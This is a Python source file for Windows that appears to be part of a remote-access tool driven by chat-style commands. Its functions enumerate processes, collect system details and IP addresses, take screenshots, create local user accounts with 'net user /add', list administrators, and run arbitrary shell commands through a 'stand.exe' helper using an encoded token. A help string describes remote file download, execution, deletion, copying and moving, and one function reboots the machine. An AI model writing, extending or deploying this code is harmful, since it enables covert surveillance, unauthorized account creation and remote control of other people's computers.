import win32pdh, string, win32api, os
from shutil import copy2, move
import Cryptography
def GetAllTask():
    # each instance is a process, you can have multiple processes w/same name
    junk, instances = win32pdh.EnumObjectItems(None, None, 'process', win32pdh.PERF_DETAIL_WIZARD)
    proc_ids = []
    proc_dict = {}
    for instance in instances:
        if instance in proc_dict:
            proc_dict[instance] = proc_dict[instance] + 1
        else:
            proc_dict[instance] = 0
    for instance, max_instances in proc_dict.items():
        for inum in range(max_instances + 1):
            hq = win32pdh.OpenQuery()  # initializes the query handle
            path = win32pdh.MakeCounterPath((None, 'process', instance, None, inum, 'ID Process'))
            counter_handle = win32pdh.AddCounter(hq, path)
            win32pdh.CollectQueryData(hq)  # collects data for the counter
            type, val = win32pdh.GetFormattedCounterValue(counter_handle, win32pdh.PDH_FMT_LONG)
            proc_ids.append((instance, str(val)))
            win32pdh.CloseQuery(hq)

    proc_ids.sort()
    return proc_ids

def GetPlatformInfo():
    import wmi

    computer = wmi.WMI()
    computer_info = computer.Win32_ComputerSystem()[0]
    os_info = computer.Win32_OperatingSystem()[0]
    proc_info = computer.Win32_Processor()[0]
    gpu_info = computer.Win32_VideoController()[0]

    os_name = os_info.Name.encode('utf-8').split(b'|')[0]
    os_version = ' '.join([os_info.Version, os_info.BuildNumber])
    system_ram = float(os_info.TotalVisibleMemorySize) / 1048576  # KB to GB

    temp = ""
    #print(str(computer_info))

    temp += '*Caption :* ' + computer_info.Caption + "\n"
    temp += '*CurrentTimeZone :* ' + str(computer_info.CurrentTimeZone) + "\n"
    temp += '*DNSHostName : * ' + computer_info.DNSHostName + "\n"
    temp += '*Domain : * ' + computer_info.Domain + "\n"
    temp += '*TotalPhysicalMemory : * ' + computer_info.TotalPhysicalMemory + "\n"
    temp += '*Manufacturer : * ' + str(computer_info.Manufacturer) + "\n"
    temp += '*OS Name:* {0}'.format(os_name) + "\n"
    temp += '*OS Version:* {0}'.format(os_version) + "\n"
    temp += '*CPU:* {0}'.format(proc_info.Name) + "\n"
    temp += '*RAM:* {0} GB'.format(system_ram) + "\n"
    temp += '*Graphics Card:* {0}'.format(gpu_info.Name) + "\n"
    return temp


def TakeScreenShoot():
    import PIL.ImageGrab
    PIL.ImageGrab.grab().save('temp.png')
    return 'temp.png'

def GetIP():
    import requests
    import socket
    ip = []
    ip.append(requests.get("http://checkip.amazonaws.com").text)
    ip.append(socket.gethostbyname(socket.gethostname()))
    return ip


def AddUser(token, id, name, pwd):
    try:
        t = Cryptography.BigAss().encode(token)
        i = Cryptography.BigAss().encode(str(id))
        os.system(os.getcwd()+"\\stand.exe \"{0}\" \"{1}\" \"{2}\"".format(t, i, 'net user {0} {1} /add'.format(name, pwd)))
    except Exception as ew:
        print(ew)

def GetList_of_admins(token, id):
    try:
        t = Cryptography.BigAss().encode(token)
        i = Cryptography.BigAss().encode(str(id))
        os.system(os.getcwd()+"\\stand.exe \"{0}\" \"{1}\" \"{2}\"".format(t, i, "net localgroup Administrators"))
    except Exception as ew:
        print(ew)

def GetList_of_users(token, id):
    try:
        t = Cryptography.BigAss().encode(token)
        i = Cryptography.BigAss().encode(str(id))
        os.system(os.getcwd()+"\\stand.exe \"{0}\" \"{1}\" \"{2}\"".format(t, i, "net localgroup Users"))
    except Exception as ew:
        print(ew)



def ShellScript(script, token, id):
    try:
        t = Cryptography.BigAss().encode(token)
        i = Cryptography.BigAss().encode(str(id))
        os.system(os.getcwd()+"\\stand.exe \"{0}\" \"{1}\" \"{2}\"".format(t, i, script))
    except Exception as ew:
        print(ew)

def Help():
    return "*get:*\t_[download file like > get:c:\\text.txt]_\n*cmd:*\t_[run cmd script like > cmd:dir c:\\]_"\
    + "*open:*\t_[open the file like > open:c:\\sample.exe]_\n" \
    + "*delete:*_[delete file like > delete:c:\\netbook.txt]_\n"\
    + "*copy:*_copy file like > copy:c:\\a.txt->c:\\windows\\a.txt_\n"\
    + "*move:*_[move file like > move:c:\\a.txt->d:\\a.txt]_\n"


def open_file(path):
    return os.system(path)

def delete_file(path):
    return os.remove(path)

def copy_file(src, dis):
    print(src)
    return copy2(src, dis)

def move_file(src, dis):
    return move(src, dis)

def reboot():
    os.system("shutdown /r")
